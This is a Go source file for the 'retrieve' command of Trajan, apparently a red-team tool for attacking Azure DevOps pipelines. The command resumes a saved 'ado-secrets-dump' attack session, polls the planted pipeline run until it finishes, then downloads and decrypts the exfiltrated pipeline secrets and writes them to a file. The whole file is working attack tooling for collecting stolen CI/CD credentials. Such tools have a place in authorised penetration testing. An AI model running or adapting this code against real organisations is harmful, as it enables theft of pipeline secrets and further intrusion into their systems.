package ado

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/spf13/cobra"

	"github.com/praetorian-inc/trajan/internal/cmdutil"
	"github.com/praetorian-inc/trajan/internal/registry"
	"github.com/praetorian-inc/trajan/pkg/attacks"
	"github.com/praetorian-inc/trajan/pkg/azuredevops"
	"github.com/praetorian-inc/trajan/pkg/azuredevops/attacks/common"
	"github.com/praetorian-inc/trajan/pkg/platforms"
)

var (
	retrieveSessionID string
	retrieveOrg       string
	retrieveWait      time.Duration
)

var retrieveCmd = &cobra.Command{
	Use:   "retrieve",
	Short: "Retrieve and decrypt secrets from an ADO pipeline run",
	Long: `Trajan - Azure DevOps - Retrieve

Download and decrypt artifacts from an ADO secrets-dump pipeline run.

After running 'trajan ado attack --plugin ado-secrets-dump', use this command
to re-retrieve the exfiltrated secrets if the inline retrieval failed.

The session ID is printed in the attack output. All other parameters (pipeline ID,
run ID, project, private key) are looked up from the saved session automatically.`,
	RunE: runRetrieve,
}

func init() {
	retrieveCmd.Flags().SortFlags = false
	retrieveCmd.Flags().StringVar(&retrieveSessionID, "session", "", "session ID from attack output")
	retrieveCmd.Flags().StringVar(&retrieveOrg, "org", "", "Azure DevOps organization name or URL (auto-detected from session)")
	retrieveCmd.Flags().DurationVar(&retrieveWait, "wait", 5*time.Minute, "max time to wait for pipeline completion")
	_ = retrieveCmd.MarkFlagRequired("session")
}

func runRetrieve(cmd *cobra.Command, args []string) error {
	if retrieveSessionID == "" {
		return fmt.Errorf("--session is required")
	}

	// Load session and extract pipeline details
	pipelineID, runID, privateKeyPEM, project, org, err := findSecretsRunInSession(retrieveSessionID)
	if err != nil {
		return fmt.Errorf("loading session %s: %w", retrieveSessionID, err)
	}

	// Allow flags to override session values
	if retrieveOrg != "" {
		org = retrieveOrg
	}

	if project == "" {
		return fmt.Errorf("could not determine project from session")
	}
	if org == "" {
		return fmt.Errorf("could not determine organization - use --org flag")
	}

	fmt.Fprintf(os.Stderr, "Session %s: pipeline=%d, run=%d, project=%s\n",
		retrieveSessionID, pipelineID, runID, project)

	// Initialize ADO client
	t := getToken(cmd)
	bt := getBearerToken(cmd)
	if t == "" && bt == "" {
		return fmt.Errorf("no token provided (use --token, --azure-bearer-token, or set AZURE_DEVOPS_PAT/AZURE_BEARER_TOKEN)")
	}

	platform, err := registry.GetPlatform("azuredevops")
	if err != nil {
		return fmt.Errorf("getting ADO platform: %w", err)
	}

	initConfig := platforms.Config{
		Token:       t,
		Concurrency: 10,
		AzureDevOps: &platforms.AzureDevOpsAuth{
			PAT:          t,
			BearerToken:  bt,
			Organization: org,
		},
	}
	if strings.HasPrefix(org, "https://") || strings.HasPrefix(org, "http://") {
		initConfig.BaseURL = org
	} else {
		initConfig.BaseURL = fmt.Sprintf("https://dev.azure.com/%s", org)
	}
	cmdutil.ApplyProxyFlags(cmd, &initConfig)

	ctx := context.Background()
	if err := platform.Init(ctx, initConfig); err != nil {
		return fmt.Errorf("initializing ADO platform: %w", err)
	}

	adoPlatform, ok := platform.(*azuredevops.Platform)
	if !ok {
		return fmt.Errorf("unexpected platform type")
	}
	client := adoPlatform.Client()

	// Wait for pipeline to complete
	fmt.Fprintf(os.Stderr, "Waiting for pipeline run %d to complete...\n", runID)
	startTime := time.Now()
	for {
		run, err := client.GetPipelineRun(ctx, project, pipelineID, runID)
		if err != nil {
			return fmt.Errorf("getting pipeline run: %w", err)
		}

		if run.State == "completed" {
			if run.Result != "succeeded" {
				fmt.Fprintf(os.Stderr, "Warning: pipeline concluded with %q\n", run.Result)
			}
			fmt.Fprintf(os.Stderr, "Pipeline completed (result: %s)\n", run.Result)
			break
		}

		if time.Since(startTime) > retrieveWait {
			return fmt.Errorf("timed out waiting for pipeline run %d (state: %s)", runID, run.State)
		}

		fmt.Fprintf(os.Stderr, "  State: %s, waiting...\n", run.State)
		time.Sleep(5 * time.Second)
	}

	// Retrieve and decrypt
	decrypted, err := common.RetrieveAndDecryptSecrets(ctx, client, project, pipelineID, runID, "encrypted-secrets", privateKeyPEM)
	if err != nil {
		return fmt.Errorf("retrieving/decrypting secrets: %w", err)
	}

	// Format and output
	outputFormat := cmdutil.GetOutput(cmd)
	switch outputFormat {
	case "json":
		var parsed interface{}
		if json.Unmarshal(decrypted, &parsed) == nil {
			enc := json.NewEncoder(os.Stdout)
			enc.SetIndent("", "  ")
			return enc.Encode(map[string]interface{}{
				"session":     retrieveSessionID,
				"run_id":      runID,
				"pipeline_id": pipelineID,
				"project":     project,
				"secrets":     parsed,
			})
		}
		fmt.Println(string(decrypted))
	default:
		// Write structured output to file
		formatted, fmtErr := common.FormatStructuredSecrets(decrypted)
		if fmtErr != nil {
			formatted = common.FormatDecryptedSecrets(decrypted)
		}

		outputPath := fmt.Sprintf("ado-secrets-%s.txt", retrieveSessionID)
		if writeErr := common.WriteSecretsToFile(formatted, outputPath); writeErr != nil {
			return fmt.Errorf("writing secrets file: %w", writeErr)
		}

		summary := common.SecretsSummary(decrypted)
		fmt.Printf("Secrets written to: %s\n", outputPath)
		fmt.Printf("Summary: %s\n", summary)
	}

	return nil
}

// findSecretsRunInSession loads a session by ID and extracts the pipeline run details
// from the first secrets-dump result.
func findSecretsRunInSession(sessionID string) (pipelineID, runID int, privateKeyPEM, project, org string, err error) {
	session, err := attacks.LoadSession(sessionID)
	if err != nil {
		return 0, 0, "", "", "", err
	}

	org = session.Org

	for _, result := range session.Results {
		if result.Data == nil {
			continue
		}

		dataMap, ok := result.Data.(map[string]interface{})
		if !ok {
			continue
		}

		// Need both pipeline_id and run_id
		pid, pidOk := toInt(dataMap["pipeline_id"])
		rid, ridOk := toInt(dataMap["run_id"])
		if !pidOk || !ridOk {
			continue
		}

		pkey, _ := dataMap["private_key_pem"].(string)
		proj, _ := dataMap["project"].(string)

		if pkey == "" {
			continue
		}

		return pid, rid, pkey, proj, org, nil
	}

	return 0, 0, "", "", "", fmt.Errorf("no secrets-dump result with pipeline/run IDs found in session %s", sessionID)
}

// toInt converts a JSON-deserialized numeric value to int.
func toInt(v interface{}) (int, bool) {
	switch n := v.(type) {
	case float64:
		return int(n), true
	case int:
		return n, true
	case json.Number:
		i, err := n.Int64()
		return int(i), err == nil
	default:
		return 0, false
	}
}
